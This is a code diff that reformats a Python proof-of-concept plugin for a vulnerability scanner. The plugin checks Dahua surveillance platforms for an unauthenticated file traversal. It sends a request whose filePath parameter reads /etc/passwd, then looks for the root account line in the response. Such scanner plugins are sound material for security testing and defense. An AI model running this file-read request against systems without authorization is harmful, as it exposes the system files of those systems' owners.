@@ -1,22 +1,23 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Dahuatech_0006' # 平台漏洞编号，留空
-    name = '大华城市安防监控系统平台管理存在任意文件遍历' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.MISCONFIGURATION # 漏洞类型
+    vuln_id = 'Dahuatech_0006'  # 平台漏洞编号，留空
+    name = '大华城市安防监控系统平台管理存在任意文件遍历'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.MISCONFIGURATION  # 漏洞类型
     disclosure_date = '2015-11-05'  # 漏洞公布时间
     desc = '''
         大华城市安防监控系统平台管理存在任意文件遍历(无需登录) 
-    ''' # 漏洞描述
-    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=131730' # 漏洞来源
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=131730'  # 漏洞来源
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'Dahuatech'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
 
@@ -24,7 +25,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'ae528da8-cceb-4850-bc50-166c84857d65'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -36,11 +37,11 @@ class Poc(ABPoc):
             arg = '{target}'.format(target=self.target)
             p = '/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd'
             url = arg + p
-            code2, head, res, errcode, _ = hh.http(url )
+            code2, head, res, errcode, _ = hh.http(url)
             #print res
-            if (code2 == 200) and('root:x:0:0:root:/root:/bin/bash' in res) :
-                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                            target=self.target, name=self.vuln.name))
+            if (code2 == 200) and('root:x:0:0:root:/root:/bin/bash' in res):
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
